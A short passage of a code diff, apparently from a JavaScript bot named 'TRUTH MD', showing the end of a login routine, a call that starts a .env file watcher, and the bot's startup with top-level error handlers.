+        // Force an exit to restart the entire login flow cleanly
+        process.exit(1);
+    }
+    
+    // 9. Start the file watcher after an interactive login completes successfully
+    checkEnvStatus(); // <--- START .env FILE WATCHER (Mandatory)
+}
+
+// --- Start bot (TRUTH MD) ---
+tylor().catch(err => log(`Fatal error starting bot: ${err.message}`, 'red', true));
+process.on('uncaughtException', (err) => log(`Uncaught Exception: ${err.message}`, 'red', true));
+process.on('unhandledRejection', (err) => log(`Unhandled Rejection: ${err.message}`, 'red', true));
